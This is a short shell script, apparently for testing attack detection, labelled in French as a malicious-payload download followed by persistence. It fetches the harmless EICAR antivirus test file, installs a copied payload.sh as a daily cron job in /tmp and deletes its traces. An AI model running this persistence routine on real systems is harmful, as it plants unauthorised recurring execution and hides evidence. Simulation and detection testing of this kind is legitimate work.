#!/bin/sh

#Téléchargement charge malveillante
wget 'https://secure.eicar.org/eicar.com.txt'

#Persistance
cp ./payload.sh /tmp/payload.sh
crontab -l > mycron
echo "0 0 * * * /tmp/payload.sh" >> mycron
crontab mycron
rm mycron
rm ./payload.sh

